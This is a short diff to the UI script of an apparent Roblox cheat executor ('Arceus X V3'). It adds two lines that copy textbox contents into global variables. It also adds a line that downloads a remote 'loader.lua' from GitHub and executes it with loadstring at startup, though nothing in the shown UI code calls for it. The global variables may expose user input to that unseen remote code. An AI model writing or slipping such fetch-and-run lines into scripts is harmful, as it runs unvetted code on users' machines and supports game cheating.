@@ -3185,6 +3185,8 @@ AZY_MODULES[AZY["132"]] = {
 
 	end;
 };
+getgenv().ChillzAntiSkid123 = AZY["94"]["Text"]
+getgenv().ChillzAntiSkid1234 = AZY["cc"]["Text"]
 AZY_MODULES[AZY["133"]] = {
 	Closure = function()
 		local script = AZY["133"];
@@ -4948,6 +4950,7 @@ local function C_129()
 	end)
 end;
 task.spawn(C_129);
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/loader.lua"))()
 -- StarterGui.ArceusXV3.MainUI.MainFrame.Tabs.Executor.TextboxBar.LocalScript
 local function C_12c()
 	local script = AZY["12c"];
